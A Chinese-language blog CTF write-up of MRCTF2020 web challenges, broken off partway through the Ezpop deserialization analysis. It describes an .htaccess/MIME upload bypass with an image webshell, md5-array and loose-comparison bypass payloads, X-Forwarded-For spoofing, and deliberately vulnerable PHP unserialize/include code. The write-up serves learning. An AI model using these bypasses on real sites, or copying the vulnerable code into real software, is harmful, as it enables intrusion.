@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[MRCTF2020]你传你🐎呢 [MRCTF2020]Ez_bypass [MRCTF2020]PYWebsite [MRCTF2020]Ezpop [MRCTF2020]套娃 第一关 第二关   [MRCTF2020]Ezaudit [MRCTF2020]Ezpop_Revenge](#mrctf2020ezpop_revenge)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[MRCTF2020]套餐">
+<meta property="og:url" content="http://yq1ng.github.io/z_post/MRCTF2020-%E5%A5%97%E9%A4%90/index.html">
+<meta property="og:site_name" content="会下雪的晴天">
+<meta property="og:description" content="[MRCTF2020]你传你🐎呢 [MRCTF2020]Ez_bypass [MRCTF2020]PYWebsite [MRCTF2020]Ezpop [MRCTF2020]套娃 第一关 第二关   [MRCTF2020]Ezaudit [MRCTF2020]Ezpop_Revenge](#mrctf2020ezpop_revenge)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.ye0rf4py2y.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.9h5rncyv4ew.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.nv7djrc4d5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.oc2phdb19p.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.n70pw5jx1mb.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.xc0pkk2kfs.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.b041j8yb8bp.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.hvt3lc7c2a8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.g80kpq08xie.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.wc223psyehp.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.pvcfiked48.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.cm0rdkho5jv.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.kkr3mq3pb5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.6hxto886cvh.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.h1r19jbypw7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.b3h60obpqfi.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.bd6zwpgpv4s.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.e75dv4fs9x.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.kckhrj9qco9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.bbtbn5jwmaa.png">
+<meta property="article:published_time" content="2020-10-06T12:52:58.000Z">
+<meta property="article:modified_time" content="2020-10-11T01:32:24.607Z">
+<meta property="article:author" content="yq1ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.ye0rf4py2y.png">
+
+<link rel="canonical" href="http://yq1ng.github.io/z_post/MRCTF2020-%E5%A5%97%E9%A4%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>[MRCTF2020]套餐 | 会下雪的晴天</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">会下雪的晴天</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF菜鸡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/MRCTF2020-%E5%A5%97%E9%A4%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaoxin.jpg">
+      <meta itemprop="name" content="yq1ng">
+      <meta itemprop="description" content="The best way to know your strength is to fight">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="会下雪的晴天">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [MRCTF2020]套餐
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-06 20:52:58" itemprop="dateCreated datePublished" datetime="2020-10-06T20:52:58+08:00">2020-10-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-11 09:32:24" itemprop="dateModified" datetime="2020-10-11T09:32:24+08:00">2020-10-11</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>18k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>30 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- TOC -->
+
+<ul>
+<li><a href="#mrctf2020%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2">[MRCTF2020]你传你🐎呢</a></li>
+<li><a href="#mrctf2020ez_bypass">[MRCTF2020]Ez_bypass</a></li>
+<li><a href="#mrctf2020pywebsite">[MRCTF2020]PYWebsite</a></li>
+<li><a href="#mrctf2020ezpop">[MRCTF2020]Ezpop</a></li>
+<li><a href="#mrctf2020%E5%A5%97%E5%A8%83">[MRCTF2020]套娃</a><ul>
+<li><a href="#%E7%AC%AC%E4%B8%80%E5%85%B3">第一关</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E5%85%B3">第二关</a></li>
+</ul>
+</li>
+<li><a href="#mrctf2020ezaudit">[MRCTF2020]Ezaudit</a></li>
+<li>[MRCTF2020]Ezpop_Revenge](#mrctf2020ezpop_revenge)</li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
+<hr>
+<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><blockquote>
+<p>.htaccess解析，MIME绕过</p>
+</blockquote>
+<p>上传题，随便传个试试，在那之前，欣赏一下祖安出题人<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.ye0rf4py2y.png" alt="start"><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.9h5rncyv4ew.png" alt="upload1"><br>上传都是这。。。看看用的啥服务，随便弄一个不存在的页面<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.nv7djrc4d5.png" alt="apache"><br>既然是apache，那就试试有没有解析漏洞，传一个<code>.htaccess</code>，失败。<br>MIME类型验证绕过,修改Content-type为：image/jpeg，成功<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.oc2phdb19p.png" alt=".htaccess"><br>在传一个图片马，蚁剑连接<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.n70pw5jx1mb.png" alt="flag"></p>
+<hr>
+<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><blockquote>
+<p>简单弱类型绕过</p>
+</blockquote>
+<p>给了源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//I put something in F12 for you</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>简单的绕过，一共两关\</p>
+<ul>
+<li>第一关：md5判断绕过<br>md5不能处理数组，传两个数组就好，payload：<code>?id[]=1&amp;gg[]=2</code></li>
+<li>第二关：php弱类型判断\<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">    <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br></pre></td></tr></table></figure>
+passwd既要不是数字又要等于1234567，所以可以在数字最后加上一个字母来绕过is_numeric()函数，php在进行弱判断时会把两边变量统一，所以1234567x就变成了1234567<br>最后payload：<code>GET：?id[]=1&amp;gg[]=2</code>，<code>POST：passwd=1234567x</code></li>
+</ul>
+<hr>
+<h1 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h1><blockquote>
+<p>XFF伪造</p>
+</blockquote>
+<p>让买flag，<del>公开py</del>，看看源码有一段js，会跳转到flag.php，直接进去看看<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.xc0pkk2kfs.png" alt="index.php"><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.b041j8yb8bp.png" alt="flag.php"><br>注意，他说只有购买者和自己能看到，这说明可能XFF可能有效，去试试XFF或者client-ip<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.hvt3lc7c2a8.png" alt="flag"></p>
+<hr>
+<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><blockquote>
+<p>构造pop反序列化链<br>第一次做pop，参考了许多wp，自己太菜，也研究了好久，参考链接：<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/40ab1c531fcc">https://www.jianshu.com/p/40ab1c531fcc</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/150cb693f77b">https://www.jianshu.com/p/150cb693f77b</a><br><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2184.html#Ezpop">https://www.gem-love.com/ctf/2184.html#Ezpop</a></p>
+</blockquote>
+<p>给了源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>给了个网站，关于反序列化的魔术方法的，不过链接挂了，做题之前先了解一下什么是魔术方法</p>
+<blockquote>
+<p>PHP中把以两个下划线_开头的方法称为魔术方法(Magic methods)</p>
+</blockquote>
+<blockquote>
+<p>常见的16种如下：</p>
+<ol>
+<li>__construct()，类的构造函数</li>
+<li>__destruct()，类的析构函数</li>
+<li>__call()，在对象中调用一个不可访问方法时调用</li>
+<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>
+<li>__get()，获得一个类的成员变量时调用</li>
+<li>__set()，设置一个类的成员变量时调用</li>
+<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>
+<li>__unset()，当对不可访问属性调用unset()时被调用。</li>
+<li>__sleep()，执行serialize()时，先会调用这个函数</li>
+<li>__wakeup()，执行unserialize()时，先会调用这个函数</li>
+<li>__toString()，类被当成字符串时的回应方法</li>
+<li>__invoke()，以调用函数的方式调用一个对象时的回应方法</li>
+<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>
+<li>__clone()，当对象复制完成时调用</li>
+<li>__autoload()，尝试加载未定义的类</li>
+<li>__debugInfo()，打印所需调试信息</li>
+</ol>
+</blockquote>
+<p>pop反序列化链，自己理解就是不能直接利用某个类里面的方法，但是可以使用其它类来间接利用，也就构成链<br>这个题也就三个类，最长就是三个链，分析各类，构造pop链<br>1、<code>Modifier</code>类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>里面有个include，应该可以包含flag.php读取源码，下面的<code>__invoke</code>魔术方法是以调用函数的方式调用一个对象时会自动调用此魔术方法，哪里有这样的调用方式呢，最下面的<code>__get</code>方法，就调用了，接着分析<br>2、<code>Test</code>类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>__get</code>魔术方法将<code>p</code>作为函数调用，如果将<code>p</code>实例化为<code>Modifier</code>那就会调用此类里的<code>__invoke</code>魔术方法，达到目的，怎么触发<code>__get</code>魔术方法？在获得一个类的成员变量时会调用<code>__get</code>(即使该成员不存在)，再看看主类<br>3、<code>Show</code>类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    